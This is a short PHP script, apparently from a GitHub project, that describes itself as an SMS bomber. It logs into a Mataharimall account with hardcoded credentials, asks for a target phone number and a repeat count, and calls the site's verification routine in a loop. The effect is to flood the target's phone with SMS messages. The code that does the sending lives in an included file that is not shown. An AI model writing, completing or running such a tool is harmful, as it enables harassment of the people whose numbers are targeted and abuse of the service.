<?php
/*
    https://github.com/nee48/bomsmsmthrmall/
    Made by = Hacker online
    Modified by まやちゃん
*/

include 'bommthrml.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "zumupolij@c1oramn.com";
$init->pass = "Hilih kintil";
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber
echo "[?] Nomor : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "[?] Jumlah : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
